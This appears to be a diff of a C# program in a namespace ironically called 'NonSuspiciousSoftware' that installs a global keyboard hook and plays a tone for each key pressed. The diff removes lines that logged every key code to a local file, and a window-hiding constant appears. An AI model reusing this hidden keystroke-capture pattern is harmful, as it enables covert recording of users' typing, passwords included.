@@ -55,15 +55,12 @@ namespace NonSuspiciousSoftware
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine(vkCode);
                 StartSineWave(vkCode);
-                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                sw.Write(vkCode);
-                sw.Close();
-
+                
             }
             else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
             {
                 Console.WriteLine(" UP");
-                StopSinWave();
+                 StopSinWave();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -91,22 +88,26 @@ namespace NonSuspiciousSoftware
 
         const int SW_HIDE = 0;
 
-        private static async void StartSineWave(int vkCode)
+        private static void StartSineWave(int vkCode)
         {
             if (waveOut == null)
             {
                 var sineWaveProvider = new SineWaveProvider32();
-                sineWaveProvider.SetWaveFormat(80000, 1); 
-                sineWaveProvider.Frequency = _startingFrequency + vkCode *15;
+                sineWaveProvider.SetWaveFormat(48000, 1); 
+                sineWaveProvider.Frequency = _startingFrequency + vkCode *27;
+                Console.WriteLine(sineWaveProvider.Frequency);
                 sineWaveProvider.Amplitude = 0.25f;
                 waveOut = new WaveOut();
                 waveOut.Init(sineWaveProvider);
                 waveOut.Play();
-                StopSinWave();
             }
         }
         private static void StopSinWave()
         {
+            if (waveOut == null)
+            {
+                return;
+            }
             waveOut.Stop();
             waveOut.Dispose();
             waveOut = null;
